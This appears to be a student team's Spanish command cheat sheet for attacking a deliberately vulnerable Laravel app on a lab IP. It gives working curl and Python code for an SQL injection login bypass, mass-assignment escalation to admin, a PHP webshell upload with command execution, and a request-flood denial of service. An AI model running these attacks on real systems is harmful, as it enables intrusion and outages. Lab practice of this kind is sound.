# 06 - Comandos Útiles

## Verificación del servicio
```bash
# Endpoints principales
curl -s -o /dev/null -w "%{http_code}" http://192.168.18.38:8001/login
curl -s -o /dev/null -w "%{http_code}" http://192.168.18.38:8001/register
curl -s -o /dev/null -w "%{http_code}" http://192.168.18.38:8001/

# Assets estáticos
curl -s -o /dev/null -w "%{http_code}" http://192.168.18.38:8001/build/assets/app-BK7y2LJC.css
curl -s -o /dev/null -w "%{http_code}" http://192.168.18.38:8001/images/logo-plazamoyobanba.png
```

## SQL Injection (Tomi)
```bash
# Obtener token
TOKEN=$(curl -s -c c.txt "http://192.168.18.38:8001/login" | grep -oP 'name="_token" value="\K[^"]+')

# Login como admin (sin pass)
curl -s -X POST "http://192.168.18.38:8001/login" \
  -b c.txt -c c.txt \
  -d "_token=$TOKEN&login=admin'+OR+'1'%3D'1'+--&password=x"

# Verificar admin
curl -b c.txt "http://192.168.18.38:8001/admin/dashboard"
```

## Mass Assignment (Bri)
```python
# Usar Python para manejo de sesión
python3 -c "
import requests, re
s = requests.Session()
b = 'http://192.168.18.38:8001'

# Registrar
r = s.get(b+'/register')
t = re.search(r'name=\"_token\" value=\"([^\"]+)\"', r.text).group(1)
s.post(b+'/register', data={'_token':t,'name':'Bri','username':'bri','email':'bri@t.com','password':'Pass123456','password_confirmation':'Pass123456'})

# Escalar
r = s.get(b+'/profile')
t = re.search(r'name=\"_token\" value=\"([^\"]+)\"', r.text).group(1)
s.post(b+'/profile', data={'_token':t,'_method':'patch','name':'Bri','email':'bri@t.com','role_name':'admin'})

# Admin?
r = s.get(b+'/admin/dashboard')
print('Admin:', r.status_code)
"
```

## File Upload / RCE (Alex)
```bash
# Crear webshell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Subir (extraer token)
TOKEN=$(curl -s "http://192.168.18.38:8001/login" | grep -oP 'name="_token" value="\K[^"]+')
curl -s -X POST "http://192.168.18.38:8001/upload" \
  -d "_token=$TOKEN" \
  -F "file=@shell.php"

# Ejecutar comandos
curl "http://192.168.18.38:8001/uploads/shell.php?cmd=id"
curl "http://192.168.18.38:8001/uploads/shell.php?cmd=cat+/etc/os-release"
```

## DDoS (Tomi)
```bash
# Línea base
time curl -s -o /dev/null http://192.168.18.38:8001/login

# Ataque (100 conexiones concurrentes, 15s)
python3 -c "
import requests, time
from concurrent.futures import ThreadPoolExecutor
stop = False
def a():
    while not stop:
        try: requests.get('http://192.168.18.38:8001/login', timeout=5)
        except: pass
with ThreadPoolExecutor(max_workers=100) as ex:
    [ex.submit(a) for _ in range(100)]
    time.sleep(15)
    stop = True
"
```

## Docker (servidor)
```bash
# Estado
docker ps -a

# Logs
docker compose logs -f --tail 50

# Reconstruir
docker compose down && docker compose up -d --build

# Ejecutar comandos en el container
docker compose exec app php artisan tinker
docker compose exec app composer install
docker compose exec app npm run build

# DB
docker compose exec db psql -U plaza_user -d plazamoyobanba
```

## Git
```bash
git clone https://github.com/bvasquezkeysije/Sistema-PlazaMoyobanba.git
cd Sistema-PlazaMoyobanba
git checkout sistema-con-vulnerabilidades
git pull origin sistema-con-vulnerabilidades
```
